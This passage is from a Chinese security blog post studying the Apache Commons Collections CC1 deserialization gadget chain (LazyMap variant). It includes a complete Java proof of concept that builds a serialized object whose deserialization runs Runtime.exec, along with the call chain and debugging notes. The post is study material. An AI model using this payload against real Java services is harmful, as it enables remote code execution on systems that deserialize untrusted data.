+<pre><code>innermap.put(&quot;value&quot;, &quot;xxx&quot;);
+</code></pre><p>其实这里不止这一个类可以使用,如<strong>java.lang.annotation.Target</strong> 也可</p>
+<h2 id="流程图-1"><a href="#流程图-1" class="headerlink" title="流程图"></a>流程图</h2><p><img src="/2021/07/13/CC链学习-上/image-20210713181527943.png" alt="image-20210713181527943"></p>
+<h1 id="lazymap链"><a href="#lazymap链" class="headerlink" title="lazymap链"></a>lazymap链</h1><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><pre><code class="java">import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Retention;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+public class CommonCollections12 {
+    public static Object generatePayload() throws Exception {
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] { String.class, Class[].class }, new Object[] { &quot;getRuntime&quot;, new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;, new Class[] { String.class }, new Object[] { &quot;calc&quot; })
+        };
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+        Map innermap = new HashMap();
+        innermap.put(&quot;value&quot;, &quot;xxx&quot;);
+        Map outmap = LazyMap.decorate(innermap,transformerChain);
+        //通过反射获得AnnotationInvocationHandler类对象
+        Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        //通过反射获得cls的构造函数
+        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
+        //这里需要设置Accessible为true，否则序列化失败
+        ctor.setAccessible(true);
+        //通过newInstance()方法实例化对象
+        InvocationHandler handler = (InvocationHandler)ctor.newInstance(Retention.class, outmap);
+        Map mapProxy = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),handler);
+        Object instance = ctor.newInstance(Retention.class, mapProxy);
+
+        return instance;
+    }
+    public static void main(String[] args) throws Exception {
+        payload2File(generatePayload(),&quot;obj&quot;);
+        payloadTest(&quot;obj&quot;);
+    }
+    public static void payload2File(Object instance, String file)
+            throws Exception {
+        //将构造好的payload序列化后写入文件中
+        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file));
+        out.writeObject(instance);
+        out.flush();
+        out.close();
+    }
+    public static void payloadTest(String file) throws Exception {
+        //读取写入的payload，并进行反序列化
+        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
+        in.readObject();
+        in.close();
+    }
+}
+</code></pre>
+<h2 id="调用链-1"><a href="#调用链-1" class="headerlink" title="调用链"></a>调用链</h2><pre><code>ObjectInputStream.readObject()
+            AnnotationInvocationHandler.readObject()
+                Map(Proxy).entrySet()
+                    AnnotationInvocationHandler.invoke()
+                        LazyMap.get()
+                            ChainedTransformer.transform()
+                                ConstantTransformer.transform()
+                                InvokerTransformer.transform()
+                                    Method.invoke()
+                                        Class.getMethod()
+                                InvokerTransformer.transform()
+                                    Method.invoke()
+                                        Runtime.getRuntime()
+                                InvokerTransformer.transform()
+                                    Method.invoke()
+                                        Runtime.exec()
+</code></pre><p>这里的后半段和前面一样,所以我们只用看前面就行了</p>
+<h2 id="lazymap"><a href="#lazymap" class="headerlink" title="lazymap"></a>lazymap</h2><p>在lazymap中有一个get方法,可以执行factory成员的transform方法,这里</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210713211304053.png" alt="image-20210713211304053"></p>
+<p>这里factory可控,if条件也挺好进入的,将我们传入的map不要有后面传入的key就行</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210713211354814.png" alt="image-20210713211354814"></p>
+<p>我们接下来只需要找到一个readObject方法调用了该get方法即可</p>
+<h2 id="AnnotationInvocationHandler-1"><a href="#AnnotationInvocationHandler-1" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p><img src="/2021/07/13/CC链学习-上/image-20210623213042559.png" alt="image-20210623213042559"></p>
+<p>其实在该类中的readObject方法中并没有找到能有直接引用map的get方法的,但是有一个invoke中可以执行get方法,这就需要引入一点点java代理的知识</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210623214337512.png" alt="image-20210623214337512"></p>
+<p>这里就简单的提一下:</p>
+<pre><code class="java">InvocationHandler handler = new ExampleInvocationHandler(new HashMap()); //创建一个InvocationHandler接口的对象
+Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); //第一个参数为类加载器,第二个参数类型,第三个参数传入我们的接口
+当我们引用proxyMap中的方法时,会先在handler中的invoke方法中进行修饰,执行invoke里的代码
+</code></pre>
+<p>我们的memberValues成员为lazymap对象(memberValues的赋值在构造函数中,且我们可控),当我们执行到下面这里的时候,就会触发代理机制,然后进入Invoke方法,从而触发命令执行</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210713213129129.png" alt="image-20210713213129129"></p>
+<h2 id="流程图-2"><a href="#流程图-2" class="headerlink" title="流程图"></a>流程图</h2><p><img src="/2021/07/13/CC链学习-上/image-20210713214802733.png" alt="image-20210713214802733"></p>
+<h2 id="调试时遇到的问题"><a href="#调试时遇到的问题" class="headerlink" title="调试时遇到的问题"></a>调试时遇到的问题</h2><p>有时在进行调试的时候我是没有进入if语句的,但也莫名奇妙的弹出了计算器,而且按照我们原本的思路是应该进入if语句的(super.map中是不含我们的key的)</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210703110458579.png" alt="image-20210703110458579"></p>
+<p>然后后面切换了一下打断点的位置又可以进去了,我认为这里是因为在调试的时候会调用一些方法,从而影响了我们的调试(这个坑搞了我大半天,希望不要有人跟我一样卡在同样的位置了呜呜呜)</p>
+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>CC1很重要,后面几条链子后半段几乎都是用CC1的</p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="/img/custom/donate/zhifubaoSQ.jpg"></li>
+                <li class="wechat-code"><img src="/img/custom/donate/wechatSQ.jpg"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/2021/07/13/CC链学习-下/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="\img\article\2.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="\img\article\2.png">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                CC链学习-下</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="" class="profile gravatar"><img src="\img\custom\head.jpg" itemprop="image" alt="Yasax1" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="" itemprop="url" rel="author">Yasax1</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i>一个好奇的人</p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
+</div>
+
+
+
+    </div>    
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            // PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+    
+<!-- <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 Pp1ove<br>
+      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer> -->
+<footer id="colophon" class="site-footer" role="contentinfo">
+  <div class="site-info">
+    <div class="footertext">
+      <div class="img-preload">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
+      </div>
+      <p style="color: #666666;">&copy 2021 HAPPY NEW YEAR !!!</p>
+    </div>
+       <center>
+                网站已运行:<span id="run_time" style="color:black"></span>
+            </center>
+
+            <script>
+                function runTime() {
+                    var d = new Date(), str = '';
+                    BirthDay = new Date("January 01,2021");
+                    today = new Date();
+                    timeold = (today.getTime() - BirthDay.getTime());
+                    sectimeold = timeold / 1000
+                    secondsold = Math.floor(sectimeold);
+                    msPerDay = 24 * 60 * 60 * 1000
+                    msPerYear = 365 * 24 * 60 * 60 * 1000
+                    e_daysold = timeold / msPerDay
+                    e_yearsold = timeold / msPerYear
+                    daysold = Math.floor(e_daysold);
+                    yearsold = Math.floor(e_yearsold);
+                    //str = yearsold + "年";
+                    str += daysold + "天";
+                    str += d.getHours() + '时';
+                    str += d.getMinutes() + '分';
+                    str += d.getSeconds() + '秒';
+                    return str;
+                }
+                setInterval(function () { $('#run_time').html(runTime()) }, 1000);
+            </script>
+    <div class="footer-device">
+    <p style="font-family: 'Ubuntu', sans-serif;">
+        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
+        </span>
+      </p>
+    </div>
+  </div><!-- .site-info -->
+</footer>
+
+
+
+<!-- <script src="/js/tocbot.js"></script> -->
+<script type="text/javascript" src="/js/lib.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script type="text/javascript" src="/js/InsightSearch.js"></script>
+<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
+<script type="text/javascript" src="/js/zoom.min.js"></script>
+<script type="text/javascript" src="/js/sakura-app.js"></script>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
+<script src="/js/botui.js"></script>
+<!-- 不蒜子 网页计数器 -->
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
+<script type="text/javascript">
+/* <![CDATA[ */
+if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  var Poi = {"pjax":"1","movies":{"url": "","name":"","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+} else {
+  var Poi = {"pjax":"1","movies":{"url": "","name":"","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+}
+/* ]]> */
+
+</script>
+
+<script>
+$(document).ready(function() {
+  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
+    if ($(".pattern-center").length > 0) { //有图的情况
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -400,
+          scrollSmoothOffset: -85
+      });
+    } else {
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -85,
+          scrollSmoothOffset: -85
+      });
+    }
+    var offsetTop = $('.toc').offset().top - 95;
+    window.onscroll = function() {
+      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
+      if (scrollTop >= offsetTop) {
+        $('.toc').addClass('toc-fixed');
+      } else {
+        $('.toc').removeClass('toc-fixed');
+      }
+    }
+  }
+});
+</script>
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js"></script>
+    <div class="openNav no-select" style="height: 50px;">
+      <div class="iconflat no-select" style="width: 50px; height: 50px;">
+        <div class="icon"></div>
+      </div>
+      <div class="site-branding search-form-submit">
+        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
+      </div>
+    </div>
+  </section>
+
+  <div class="skin-menu no-select" id="mainskin" style="position: fixed">
+ <div class="theme-controls row-container">
+  <ul class="menu-list">
+   <li id="white-bg"> <i class="fa fa-television" aria-hidden="true"></i></li>
+   <li id="sakura-bg"> <i class="iconfont icon-sakura"></i></li>
+   <li id="gribs-bg"> <i class="fa fa-slack" aria-hidden="true"></i></li>
+   <li id="KAdots-bg"> <i class="iconfont icon-dots"></i></li>
+   <li id="totem-bg"> <i class="fa fa-optin-monster" aria-hidden="true"></i></li>
+   <li id="pixiv-bg"> <i class="iconfont icon-pixiv"></i></li>
+   <li id="bing-bg"> <i class="iconfont icon-bing"></i></li>
+   <li id="dark-bg"> <i class="fa fa-moon-o" aria-hidden="true"></i></li>
+  </ul>
+ </div>
+</div>
+<canvas id="night-mode-cover"></canvas>
+ 
+  <div class="changeSkin-gear no-select">
+  <div class="keys" id="setbtn"> 
+   <span id="open-skinMenu"> 切换主题 | SCHEME TOOL  
+     <i class="iconfont icon-gear inline-block rotating"></i> 
+   </span>
+  </div>
+</div>
+
+  <div id="mo-nav" class="">
+  <div class="m-avatar">
+    <img src="/img/custom/head.jpg">
+  </div>
+  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">さくら荘そのPp1ove</p>
+  <p style="text-align: center; word-spacing: 20px;">
+    
+      
+        <a href="http://github.com/Pp1ove" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
+      
+    
+  </p>
+  <ul id="menu-new-1" class="menu">
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+            首页
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/archives">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+            归档
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/categories/技术/">
+                  <i class="fa fa-code" aria-hidden="true"></i>
+                  技术
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/复现/">
+                  <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                  复现
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/学科/">
+                  <i class="fa fa-commenting-o" aria-hidden="true"></i>
+                  学科
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/题目/">
+                  <i class="fa fa-book" aria-hidden="true"></i>
+                  题目
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="javascript:;">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+            清单
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/bangumi/">
+                  <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                  番组
+                </a>
+              </li>
+            
+              <li>
+                <a href="/music/">
+                  <i class="fa fa-headphones" aria-hidden="true"></i>
+                  歌单
+                </a>
+              </li>
+            
+              <li>
+                <a href="/tags/图集/">
+                  <i class="fa fa-photo" aria-hidden="true"></i>
+                  图集
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="/comment/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
+            留言板
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/links/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
+            友人帐
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/donate/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
+            赞赏
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+            关于
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/about/">
+                  <i class="fa fa-meetup" aria-hidden="true"></i>
+                  我？
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="/client/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-android faa-vertical" aria-hidden="true"></i>
+            客户端
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/atom.xml">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
+            RSS
+          </span>
+        </a>
+        
+      </li>
+    
+  </ul>
+  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
+</div>
+<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<!-- require MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<style>
+  .aplayer .aplayer-lrc {
+    height: 35px;
+  }
+  .aplayer .aplayer-lrc p{
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 18px !important;
+  }
+  .aplayer .aplayer-lrc p.aplayer-lrc-current{
+    color: #FF1493;
+  }
+  .aplayer.aplayer-narrow .aplayer-body{
+    left: -66px !important;
+  }
+  .aplayer.aplayer-fixed .aplayer-lrc {
+    display: none;
+  }
+  .aplayer .aplayer-lrc.aplayer-lrc-hide {
+      display:none !important;
+  }
+  .aplayer.aplayer-fixed .lrc-show {
+    display: block;
+    background: rgba(255, 255, 255, 0.8);
+  }
+</style>
+<meting-js
+
+    id="5251613646"
+
+    server="netease"
+
+    type="playlist"
+
+    fixed="true"
+
+    autoplay="false"
+
+    loop="all"
+
+    order="random"
+
+    preload="auto"
+
+    volume="0.7"
+
+    mutex="true"
+
+</meting-js>
+<script>
+  $(function(){
+    $('body').on('click', '.aplayer', function(){
+      if($('.aplayer-button').hasClass('aplayer-play')) {
+        $('.aplayer-lrc').removeClass('lrc-show');
+      } else {
+        $('.aplayer-lrc').addClass('lrc-show');
+      }
+    })
+  });
+</script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/sakura.js"></script>
+<script src="//instant.page/3.0.0" type="module" defer integrity="s</body>
+</html>
